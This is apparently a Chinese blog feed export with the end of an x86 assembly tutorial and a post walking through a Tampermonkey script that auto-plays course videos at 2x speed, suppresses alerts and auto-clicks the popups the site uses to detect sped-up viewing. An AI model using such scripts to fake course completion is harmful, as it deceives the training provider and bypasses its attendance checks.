<p>当DF位方向标志位置1时，执行完串操作指令，串操作指令地址会自动自减（高地址向低地址）<br>当DF位方向标志位置0时，执行完串操作指令，串操作指令地址会自动自增（低地址向高地址）<br>当MOVSB时，EDI ESI自减(增)一个字节；MOVSW时自减(增)两个字节；MOVSD时自减(增)四个字节</p>
<p>串操作指令用到的寄存器都是EDI和ESI，不能用其他的寄存器。</p>
<p>以C语言为例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(dest, src, size)</span><br></pre></td></tr></table></figure>

<p>EDI就相当于dest，ESI就相当于src，BYTE&#x2F;WORD&#x2F;DWORD就相当于size</p>
<h4 id="2-STOS指令-将EAX的值复制到EDI指向的内存地址中"><a href="#2-STOS指令-将EAX的值复制到EDI指向的内存地址中" class="headerlink" title="2.STOS指令  将EAX的值复制到EDI指向的内存地址中"></a>2.STOS指令  将EAX的值复制到EDI指向的内存地址中</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">STOS BYTE PTR ES:[EDI] ----------&gt; 简写为STOSB</span><br><span class="line">STOS WORD PTR ES:[EDI] ----------&gt; 简写为STOSW</span><br><span class="line">STOS DWORD PTR ES:[EDI] ---------&gt; 简写为SWOSD</span><br></pre></td></tr></table></figure>

<p>STOS指令是将AL&#x2F;AX&#x2F;EAX中的值存储到EDI里。<br>执行完之后，EDI的值也会自增(减)，也取决于DF标志位和操作数宽度</p>
<p><img src="/2023/12/10/compilation/image-20231221212906571.png" alt="image-20231221212906571"></p>
<h4 id="3-REP重复执行指令"><a href="#3-REP重复执行指令" class="headerlink" title="3.REP重复执行指令"></a>3.REP重复执行指令</h4><p>按ECX寄存器中指定的次数重复执行字符串指令，并且每执行一次ECX中的数值就会减一。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV ECX, 0x10</span><br><span class="line">REP MOVSD</span><br><span class="line">REP STOSD</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/10/compilation/image-20231221214114019.png" alt="image-20231221214114019"></p>
<p><img src="/2023/12/10/compilation/image-20231221214706745.png" alt="image-20231221214706745"></p>
<h3 id="9-修改EIP指令"><a href="#9-修改EIP指令" class="headerlink" title="9.修改EIP指令"></a>9.修改EIP指令</h3><h4 id="1-JMP指令"><a href="#1-JMP指令" class="headerlink" title="1.JMP指令"></a>1.JMP指令</h4><p>当要修改EIP指针时，不能使用mov eip, 0xFFFFFFFF直接修改EIP的值</p>
<p>但是可以通过JMP指令间接修改EIP。JMP指令表示需要跳转到哪个内存地址</p>
<p>JMP可以直接跟地址，或者跟一个寄存器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JMP 0x00000000</span><br><span class="line">		|</span><br><span class="line">		|</span><br><span class="line">		v</span><br><span class="line">MOV EAX, 0x00000000</span><br><span class="line">JMP EAX</span><br></pre></td></tr></table></figure>

<h4 id="2-CALL指令"><a href="#2-CALL指令" class="headerlink" title="2.CALL指令"></a>2.CALL指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CALL 0x00000000</span><br><span class="line">		|</span><br><span class="line">		|</span><br><span class="line">		v</span><br><span class="line">PUSH 0x00000004</span><br><span class="line">JMP 0x00000000</span><br></pre></td></tr></table></figure>

<h3 id="10-EFLAGS寄存器"><a href="#10-EFLAGS寄存器" class="headerlink" title="10.EFLAGS寄存器"></a>10.EFLAGS寄存器</h3><h4 id="1、进位标志CF-Carry-Flag"><a href="#1、进位标志CF-Carry-Flag" class="headerlink" title="1、进位标志CF(Carry Flag)"></a>1、进位标志CF(Carry Flag)</h4><p>进位标志CF主要用来反映运算是否产生进位或借位。如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。</p>
<p>使用该标志位的情况有：多字(字节)数的加减运算，无符号数的大小比较运算，移位操作，字(字节)之间移位，专门改变CF值的指令等。</p>
<h4 id="2、奇偶标志PF-Parity-Flag"><a href="#2、奇偶标志PF-Parity-Flag" class="headerlink" title="2、奇偶标志PF(Parity Flag)"></a>2、奇偶标志PF(Parity Flag)</h4><p>奇偶标志PF用于反映运算结果中“1”的个数的奇偶性。如果“1”的个数为偶数，则PF的值为1，否则其值为0。</p>
<p>利用PF可进行奇偶校验检查，或产生奇偶校验位。在数据传送过程中，为了提供传送的可靠性，如果采用奇偶校验的方法，就可使用该标志位。</p>
<h4 id="3、辅助进位标志AF-Auxiliary-Carry-Flag"><a href="#3、辅助进位标志AF-Auxiliary-Carry-Flag" class="headerlink" title="3、辅助进位标志AF(Auxiliary Carry Flag)"></a>3、辅助进位标志AF(Auxiliary Carry Flag)</h4><p>在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0：<br>(1)、在字操作时，发生低字节向高字节进位或借位时；<br>(2)、在字节操作时，发生低4位向高4位进位或借位时。</p>
<p>对以上6个运算结果标志位，在一般编程情况下，标志位CF、ZF、SF和OF的使用频率较高，而标志位PF和AF的使用频率较低。</p>
<h4 id="4、零标志ZF-Zero-Flag"><a href="#4、零标志ZF-Zero-Flag" class="headerlink" title="4、零标志ZF(Zero Flag)"></a>4、零标志ZF(Zero Flag)</h4><p>零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。</p>
<h4 id="5、符号标志SF-Sign-Flag"><a href="#5、符号标志SF-Sign-Flag" class="headerlink" title="5、符号标志SF(Sign Flag)"></a>5、符号标志SF(Sign Flag)</h4><p>符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。在微机系统中，有符号数采用补码表示法，所以，SF也就反映运算结果的正负号。运算结果为正数时，SF的值为0，否则其值为1。</p>
<h4 id="6、溢出标志OF-Overflow-Flag"><a href="#6、溢出标志OF-Overflow-Flag" class="headerlink" title="6、溢出标志OF(Overflow Flag)"></a>6、溢出标志OF(Overflow Flag)</h4><p>溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。</p>
<h4 id="7、追踪标志TF-Trap-Flag"><a href="#7、追踪标志TF-Trap-Flag" class="headerlink" title="7、追踪标志TF(Trap Flag)"></a>7、追踪标志TF(Trap Flag)</h4><p>当追踪标志TF被置为1时，CPU进入单步执行方式，即每执行一条指令，产生一个单步中断请求。这种方式主要用于程序的调试。</p>
<p>指令系统中没有专门的指令来改变标志位TF的值，但程序员可用其它办法来改变其值。</p>
<h4 id="8、中断允许标志IF-Interrupt-enable-Flag"><a href="#8、中断允许标志IF-Interrupt-enable-Flag" class="headerlink" title="8、中断允许标志IF(Interrupt-enable Flag)"></a>8、中断允许标志IF(Interrupt-enable Flag)</h4><p>中断允许标志IF是用来决定CPU是否响应CPU外部的可屏蔽中断发出的中断请求。但不管该标志为何值，CPU都必须响应CPU外部的不可屏蔽中断所发出的中断请求，以及CPU内部产生的中断请求。具体规定如下：</p>
<ul>
<li>(1)、当IF&#x3D;1时，CPU可以响应CPU外部的可屏蔽中断发出的中断请求；</li>
<li>(2)、当IF&#x3D;0时，CPU不响应CPU外部的可屏蔽中断发出的中断请求。</li>
</ul>
<p>CPU的指令系统中也有专门的指令来改变标志位IF的值。</p>
<h4 id="9、方向标志DF-Direction-Flag"><a href="#9、方向标志DF-Direction-Flag" class="headerlink" title="9、方向标志DF(Direction Flag)"></a>9、方向标志DF(Direction Flag)</h4><p>方向标志DF用来决定在串操作指令执行时有关指针寄存器发生调整的方向。在微机的指令系统中，还提供了专门的指令来改变标志位DF的值。</p>
<h3 id="11-JCC指令"><a href="#11-JCC指令" class="headerlink" title="11.JCC指令"></a>11.JCC指令</h3><img src="/2023/12/10/compilation/image-20231222144942623.png" alt="image-20231222144942623" style="zoom:67%;">

]]></content>
      <categories>
        <category>汇编</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>js刷课脚本实践</title>
    <url>/2024/08/01/jsScript/</url>
    <content><![CDATA[<p>某天拿到了一个刷课的网站，需要帮忙刷一下课，但是呢这个网站</p>
<ul>
<li>打开之后不自动播放</li>
<li>播放完一个视频不会自动播放下一个</li>
<li>不能直接倍速</li>
<li>不能拖动（这个解决不了QAQ）</li>
<li>检测出倍速需要点击弹出框来关闭，从而继续刷课</li>
<li>切换一个课程后有时候会弹出一个alert点击来播放视频</li>
</ul>
<p>嗯……就这么多破事儿</p>
<span id="more"></span>

<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h3><p>油猴（篡改猴）扩展程序</p>
<h3 id="自动播放视频"><a href="#自动播放视频" class="headerlink" title="自动播放视频"></a>自动播放视频</h3><p>一开始的思路是直接</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>).<span class="property">play</span></span><br></pre></td></tr></table></figure>

<p>让视频播放。</p>
<p>但是在网页的控制台中这个方法可以，但是写到油猴脚本里没法运行，还是不能播放视频。因此使用浏览器模拟点击的方法。</p>
<p>在点击之前，首先要找到video视频标签，这个网页的video元素使用的应该是用js动态加载出来的，所以监听页面加载完毕的方法判断video元素加载到了页面上不太好用（实际上确实不咋好用），于是使用递归查找video元素</p>
<h4 id="查找页面中的video元素"><a href="#查找页面中的video元素" class="headerlink" title="查找页面中的video元素"></a>查找页面中的video元素</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检查页面内是否有video元素</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hasVideo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 延时100毫秒再次检查</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(hasVideo, <span class="number">500</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;再次检查&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 判断video元素内的视频是否在播放</span></span><br><span class="line">        <span class="keyword">const</span> currentVideo = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (currentVideo.<span class="property">paused</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;当前视频未播放，开始自动播放...&#x27;</span>);</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="title function_">checkVideoPlaying</span>();</span><br><span class="line">            &#125;, <span class="number">500</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果视频未开始播放，那就调用<code>checkVideoPlaying();</code>函数</p>
<h4 id="检查视频是否未播放"><a href="#检查视频是否未播放" class="headerlink" title="检查视频是否未播放"></a>检查视频是否未播放</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检查视频是否在播放</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkVideoPlaying</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//console.log(&#x27;checkVideoPlaying调用&#x27;);</span></span><br><span class="line">    <span class="comment">//const currentVideo = document.querySelector(&#x27;video&#x27;);</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// document.querySelector(&#x27;video&#x27;).play() </span></span><br><span class="line">        <span class="title function_">simulateClickOnVideo</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;当前视频开始播放&#x27;</span>);</span><br><span class="line">    &#125;, <span class="number">200</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">checkPlaybackRate</span>();<span class="comment">// 检测视频是否为2倍速播放</span></span><br><span class="line">    &#125;, <span class="number">500</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="模拟点击一下video元素"><a href="#模拟点击一下video元素" class="headerlink" title="模拟点击一下video元素"></a>模拟点击一下video元素</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">simulateClickOnVideo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> video = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (video) &#123;</span><br><span class="line">        <span class="keyword">const</span> clickEvent = <span class="keyword">new</span> <span class="title class_">MouseEvent</span>(<span class="string">&#x27;click&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">view</span>: <span class="variable language_">window</span>,</span><br><span class="line">            <span class="attr">bubbles</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">cancelable</span>: <span class="literal">true</span></span><br><span class="line">        &#125;);</span><br><span class="line">        video.<span class="title function_">dispatchEvent</span>(clickEvent);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;模拟点击 video 元素&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;未找到 video 元素&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="倍速"><a href="#倍速" class="headerlink" title="倍速"></a>倍速</h3><p>在<strong>检查视频是否未播放</strong>的时候，里面写了一个函数，<code>checkPlaybackRate();</code>检测视频是否为2倍速播放</p>
<p>先让视频两倍速播放，如果不是两倍速重新检查</p>
<p>网站支持两倍速，但是有时候他还是会检测出倍速然后暂停…………解决方法见<a href="#jump1">6. 浏览器模拟点击弹出的按钮</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检测视频是否为2倍速播放</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkPlaybackRate</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>).<span class="property">playbackRate</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> currentVideo = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (currentVideo.<span class="property">playbackRate</span> == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;2倍速播放成功&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(checkPlaybackRate, <span class="number">500</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">checkCourseLearned</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="学完自动播放下一个视频"><a href="#学完自动播放下一个视频" class="headerlink" title="学完自动播放下一个视频"></a>学完自动播放下一个视频</h3><h4 id="检测是否学完"><a href="#检测是否学完" class="headerlink" title="检测是否学完"></a>检测是否学完</h4><p>这里就要按照这个网站的特征来分析了</p>
<p><img src="/2024/08/01/jsScript/image-20240801234544151.png" alt="image-20240801234544151"></p>
<p>把鼠标放在这个对钩上面发现显示出了“已学完”</p>
<p><img src="/2024/08/01/jsScript/image-20240801234701881.png" alt="image-20240801234701881"></p>
<p>这样的是“进行中”</p>
<p><img src="/2024/08/01/jsScript/image-20240801234727101.png" alt="image-20240801234727101"></p>
<p>这样的是“未开始”</p>
<p>所以从这里入手分析</p>
<p><img src="/2024/08/01/jsScript/image-20240801234849537.png" alt="image-20240801234849537"></p>
<p>选中这个元素发现里面有一个<code>&lt;i&gt;</code>标签，里面的<code>title</code>是进行中，所以就判断这个<code>title</code>是不是已学完就可以了</p>
<p>同时发现正在播放的视频这里有一个active，没有播放的视频没有这个带active的类，所以就寻找这个带active的类，看这个类下面的<code>&lt;i&gt;</code>标签中的title是否是“已学完”。</p>
<p><img src="/2024/08/01/jsScript/image-20240801235841750.png" alt="image-20240801235841750"></p>
<p><img src="/2024/08/01/jsScript/image-20240802000239250.png" alt="image-20240802000239250"></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检测本节课是否学过</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkCourseLearned</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;checkCourseLearned调用&#x27;</span>);</span><br><span class="line">    <span class="comment">// 查找所有具有指定类名的元素</span></span><br><span class="line">    <span class="keyword">const</span> items = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.resource-item.resource-item-train.resource-item-active&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历这些元素</span></span><br><span class="line">    items.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 查找 &lt;i&gt; 标签</span></span><br><span class="line">        <span class="keyword">const</span> iElement = item.<span class="title function_">querySelector</span>(<span class="string">&#x27;i&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查 &lt;i&gt; 标签的 title 属性是否为 &quot;已学完&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (iElement &amp;&amp; iElement.<span class="property">title</span> === <span class="string">&#x27;已学完&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;找到一个已学完的资源项:&#x27;</span>, item);</span><br><span class="line">            <span class="comment">// 如果这节课学完了，就播放下一节课</span></span><br><span class="line">            <span class="title function_">playNextVideo</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//如果这节课没学完，监听视频播放结束事件</span></span><br><span class="line">            <span class="title function_">listenVideoEnd</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="监听视频是否播放完"><a href="#监听视频是否播放完" class="headerlink" title="监听视频是否播放完"></a>监听视频是否播放完</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 监听视频播放结束事件</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">listenVideoEnd</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> currentVideo = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;listenVideoEnd调用&#x27;</span>);</span><br><span class="line">    <span class="comment">// 监听视频播放结束事件</span></span><br><span class="line">    currentVideo.<span class="title function_">addEventListener</span>(<span class="string">&#x27;ended&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;当前视频播放结束，正在尝试播放下一个视频...&#x27;</span>);</span><br><span class="line">        <span class="title function_">playNextVideo</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="播放下一个视频"><a href="#播放下一个视频" class="headerlink" title="播放下一个视频"></a>播放下一个视频</h4><p>首先要找到当前激活的项<code>const activeItem = document.querySelector(&#39;.resource-item.resource-item-train.resource-item-active&#39;);</code>，然后找到下一个没有激活的项，也就是<code>.resource-item.resource-item-train</code>，找到之后就点击这个项</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 播放下一个视频</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">playNextVideo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;playNextVideo调用&#x27;</span>);</span><br><span class="line">    <span class="comment">// 找到当前激活的资源项</span></span><br><span class="line">    <span class="keyword">const</span> activeItem = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.resource-item.resource-item-train.resource-item-active&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!activeItem) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;没有找到当前激活的资源项&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(activeItem)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找到下一个资源项</span></span><br><span class="line">    <span class="keyword">let</span> nextItem = activeItem.<span class="property">nextElementSibling</span>;</span><br><span class="line">    <span class="keyword">while</span> (nextItem &amp;&amp; (!nextItem.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&#x27;resource-item&#x27;</span>) || !nextItem.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&#x27;resource-item-train&#x27;</span>))) &#123;</span><br><span class="line">        nextItem = nextItem.<span class="property">nextElementSibling</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!nextItem) &#123;</span><br><span class="line">        <span class="comment">// 如果已经是最后一个，循环回到第一个</span></span><br><span class="line">        nextItem = activeItem.<span class="property">parentNode</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.resource-item.resource-item-train&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextItem) &#123;</span><br><span class="line">        <span class="comment">// 模拟点击下一个资源项</span></span><br><span class="line">        <span class="title function_">simulateClick</span>(nextItem, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="comment">// 延时处理alert并播放视频</span></span><br><span class="line">            <span class="built_in">setTimeout</span>(handleAlertAndPlayVideo, <span class="number">3000</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;没有找到下一个资源项或资源项不符合条件&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">hasVideo</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="模拟点击"><a href="#模拟点击" class="headerlink" title="模拟点击"></a>模拟点击</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 模拟点击</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">simulateClick</span>(<span class="params">element, callback</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> clickEvent = <span class="keyword">new</span> <span class="title class_">MouseEvent</span>(<span class="string">&#x27;click&#x27;</span>, &#123;</span><br><span class="line">        <span class="string">&#x27;view&#x27;</span>: <span class="variable language_">window</span>,</span><br><span class="line">        <span class="string">&#x27;bubbles&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">&#x27;cancelable&#x27;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;);</span><br><span class="line">    element.<span class="title function_">dispatchEvent</span>(clickEvent);</span><br><span class="line">    <span class="comment">// 如果需要执行回调函数，确保点击事件处理完毕后执行</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(callback, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="处理alert"><a href="#处理alert" class="headerlink" title="处理alert"></a>处理alert</h3><p>这个可能不会生效……所以后面又写了一个直接浏览器模拟点击按钮的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 处理alert并播放视频</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handleAlertAndPlayVideo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 这里假设alert是点击后弹出的，并且需要用户确认</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">alert</span>) &#123;</span><br><span class="line">        <span class="comment">// 模拟点击alert的确定按钮</span></span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span> (<span class="params">message</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;模拟点击alert确定按钮&#x27;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="浏览器模拟点击弹出的按钮"><a href="#浏览器模拟点击弹出的按钮" class="headerlink" title="浏览器模拟点击弹出的按钮"></a><span id="jump1">浏览器模拟点击弹出的按钮</span></h3><p><img src="/2024/08/01/jsScript/image-20240802001050196.png" alt="image-20240802001050196"></p>
<p>经分析，所有的弹出按钮都有这个类</p>
<p>但是运行的时候发现，一打开脚本就跳转到搜索界面，所以肯定是某个搜索的地方也有这个类</p>
<p><img src="/2024/08/01/jsScript/image-20240802001320139.png" alt="image-20240802001320139"></p>
<p>果不其然，这个搜索图标也使用了这个类，所以再排除这个<code>fish-input-search-button</code>类就好了</p>
<blockquote>
<p>这里是怎么发现的呢…………本来这个课是放在虚拟机里刷的，因为不能离开这个网页，所以网页比例就没调，但是在某一瞬间缩小了一下比例，本来是只有一个搜索按钮的地方突然变出来一个搜索框，由于之前比例太大这个搜索框没显示，但是现在显示了，所以多了这么一个类，于是就需要排除这个类</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">simulateClickOnPrimaryButton</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> button = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.fish-btn.fish-btn-primary&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (button) &#123;</span><br><span class="line">        <span class="keyword">const</span> classList = button.<span class="property">classList</span>;</span><br><span class="line">        <span class="keyword">if</span> (classList.<span class="title function_">contains</span>(<span class="string">&#x27;fish-input-search-button&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;按钮包含 fish-input-search-button 类，不进行点击&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> clickEvent = <span class="keyword">new</span> <span class="title class_">MouseEvent</span>(<span class="string">&#x27;click&#x27;</span>, &#123;</span><br><span class="line">                <span class="attr">view</span>: <span class="variable language_">window</span>,</span><br><span class="line">                <span class="attr">bubbles</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="attr">cancelable</span>: <span class="literal">true</span></span><br><span class="line">            &#125;);</span><br><span class="line">            button.<span class="title function_">dispatchEvent</span>(clickEvent);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;模拟点击 fish-btn fish-btn-primary 按钮&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;未找到 fish-btn fish-btn-primary 按钮&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="播放完的Bug"><a href="#播放完的Bug" class="headerlink" title="播放完的Bug"></a>播放完的Bug</h3><p>有时候视频播放完会出来一个Bug，就是视频不自动暂停，这时候如果用鼠标点一下暂停键，脚本才会检测到video.ended，所以再加一个判断，判断视频已播放时长是否等于总时长</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 判断视频播放时长是否等于总时长</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isVideoDurationEqual</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> video = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (video) &#123;</span><br><span class="line">        <span class="keyword">const</span> currentTime = video.<span class="property">currentTime</span>;</span><br><span class="line">        <span class="keyword">const</span> duration = video.<span class="property">duration</span>;</span><br><span class="line">        <span class="keyword">const</span> tolerance = <span class="number">1</span>; <span class="comment">// 允许的误差范围，单位为秒</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Math</span>.<span class="title function_">abs</span>(currentTime - duration) &lt;= tolerance) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;视频播放时长等于总时长&#x27;</span>);</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="comment">// 点击video元素，触发视频暂停</span></span><br><span class="line">                <span class="title function_">simulateClickOnVideo</span>();</span><br><span class="line">            &#125;, <span class="number">3000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



